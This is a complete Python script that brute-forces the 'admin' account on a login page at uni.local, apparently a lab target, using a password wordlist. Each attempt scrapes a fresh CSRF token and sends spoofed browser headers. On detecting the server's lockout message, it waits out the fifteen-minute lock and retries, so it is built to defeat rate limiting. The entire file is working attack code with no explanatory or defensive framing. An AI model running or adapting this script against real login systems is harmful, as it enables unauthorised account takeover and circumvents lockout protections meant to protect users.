import requests
from bs4 import BeautifulSoup
import sys
import time  # Necessary for sleep functionality

# --- CONFIGURATION ---
URL_LOGIN = "http://uni.local/login.php"
USER_TARGET = "admin"
WORDLIST_FILE = "passwords.txt"

# Error messages from the PHP backend
MSG_INVALID = "Credentials not valid."
MSG_LOCKOUT = "Too many requests. Try after some minutes."

# Lockout duration in seconds (900s = 15min). 
# We add a 5-second buffer to be safe.
LOCKOUT_WAIT = 905 

# HTML Field Names
FIELD_USER = "username"
FIELD_PASS = "password"
FIELD_TOKEN = "csrf_token"
FIELD_BUTTON = "Login"
VALUE_BUTTON = "Login"
# ---------------------

session = requests.Session()

def get_csrf_token(soup_obj):
    """Extracts the dynamic CSRF token from the HTML form"""
    try:
        tag_input = soup_obj.find("input", {"name": FIELD_TOKEN})
        return tag_input["value"]
    except AttributeError:
        print("[!] Error: CSRF token not found.")
        sys.exit(1)

def bruteforce():
    print(f"[*] Starting Smart Attack on: {USER_TARGET}")
    print(f"[*] Lockout Policy: Pause for {LOCKOUT_WAIT}s after detection.")
    
    try:
        with open(WORDLIST_FILE, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"[!] Error: Wordlist {WORDLIST_FILE} not found.")
        return

    for password in passwords:
        password = password.strip()
        
        # Inner loop to handle retries for the SAME password if locked out
        while True:
            try:
                # 1. GET Request (Fresh Token)
                r_get = session.get(URL_LOGIN)
                soup = BeautifulSoup(r_get.text, "html.parser")
                token = get_csrf_token(soup)
                
                # 2. POST Request
                payload = {
                    FIELD_USER: USER_TARGET,
                    FIELD_PASS: password,
                    FIELD_TOKEN: token,
                    FIELD_BUTTON: VALUE_BUTTON 
                }
                
                headers = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
                    'Referer': URL_LOGIN
                }

                print(f"[*] Testing: {password}...", end="\r")
                
                r_post = session.post(URL_LOGIN, data=payload, headers=headers)

                # --- RESPONSE ANALYSIS ---
                
                # CASE A: Rate Limit Hit
                if MSG_LOCKOUT in r_post.text:
                    print(f"\n[!] LOCKOUT DETECTED! Server said: '{MSG_LOCKOUT}'")
                    print(f"[!] Sleeping for {LOCKOUT_WAIT} seconds...")
                    
                    # Optional: Progress bar for waiting
                    for i in range(LOCKOUT_WAIT, 0, -1):
                        sys.stdout.write(f"\rWaiting... {i}s remaining")
                        sys.stdout.flush()
                        time.sleep(1)
                    print("\n[+] Resuming attack...")
                    # 'continue' here goes back to the start of 'while True'
                    # to retry the SAME password that was blocked.
                    continue 

                # CASE B: Login Success (Error message NOT present)
                elif MSG_INVALID not in r_post.text:
                    print("\n" + "="*40)
                    print(f"[+] SUCCESS! Credentials Found: {password}")
                    print("="*40 + "\n")
                    return

                # CASE C: Invalid Credentials (Standard failure)
                else:
                    # Break the inner 'while' loop to proceed to the next password
                    break 

            except requests.exceptions.RequestException as e:
                print(f"\n[!] Network Error: {e}")
                sys.exit(1)
            
    print("\n[-] Attack finished. Password not found in wordlist.")

if __name__ == "__main__":
    bruteforce()
